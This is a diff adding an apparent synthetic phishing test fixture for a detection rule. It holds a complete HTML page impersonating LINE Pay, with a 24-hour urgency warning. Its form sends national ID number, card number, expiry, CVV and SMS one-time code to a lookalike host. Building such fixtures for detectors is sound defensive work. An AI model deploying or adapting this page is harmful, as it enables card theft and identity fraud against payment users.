@@ -1,0 +1,46 @@
+<!doctype html>
+<!--
+  Synthetic Taiwan phishing fixture — fake LINE Pay binding renewal page.
+  165 category: 假冒 LINE Pay / 解除分期付款設定. The kit asks the victim
+  to "re-bind" their card via a non-official host that mirrors LINE Pay's
+  visual language (green, rounded buttons) and requests card number + CVV
+  + 身分證字號. This combination is exactly the dom.tw_pii_combo trigger.
+-->
+<html lang="zh-Hant">
+  <head>
+    <meta charset="UTF-8">
+    <title>LINE Pay - 重新綁定信用卡</title>
+    <style>
+      body { font-family: -apple-system, "PingFang TC", "Microsoft JhengHei", sans-serif;
+             background: #f0f4ee; margin: 0; }
+      .wrap { max-width: 380px; margin: 28px auto; padding: 16px; background: white;
+              border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.06); }
+      .head { background: #00B900; color: white; padding: 14px;
+              border-radius: 8px 8px 0 0; margin: -16px -16px 16px; }
+      .head h1 { font-size: 17px; margin: 0; }
+      .urgency { background: #fff3cd; color: #856404; padding: 8px;
+                 border-radius: 4px; font-size: 13px; margin: 8px 0 16px; }
+      label { font-size: 13px; color: #444; display: block; margin-top: 10px; }
+      input { width: 100%; box-sizing: border-box; padding: 8px;
+              border: 1px solid #ccc; border-radius: 4px; margin-top: 4px;
+              font-size: 14px; }
+      button { width: 100%; padding: 12px; background: #00B900; color: white;
+               border: 0; border-radius: 4px; font-size: 15px; font-weight: 600;
+               margin-top: 16px; cursor: pointer; }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <header class="head"><h1>LINE Pay 重新綁定信用卡</h1></header>
+      <p class="urgency">⚠️ 您的 LINE Pay 信用卡綁定即將失效，請在 24 小時內完成重新綁定，以免影響您的付款服務。</p>
+      <form action="https://linepay-verify.account-renew.click/post" method="post">
+        <label>身分證字號 <input name="idno" placeholder="A123456789" pattern="[A-Z][0-9]{9}" required></label>
+        <label>信用卡卡號 <input name="card_number" placeholder="0000-0000-0000-0000" autocomplete="cc-number" required></label>
+        <label>有效期限 <input name="cc_exp" placeholder="MM/YY" autocomplete="cc-exp" required></label>
+        <label>安全碼 (CVV) <input name="cvv" placeholder="000" autocomplete="cc-csc" required></label>
+        <label>手機簡訊驗證碼 <input name="otp" inputmode="numeric" placeholder="一次性密碼" autocomplete="one-time-code" required></label>
+        <button type="submit">確認重新綁定</button>
+      </form>
+    </div>
+  </body>
+</html>
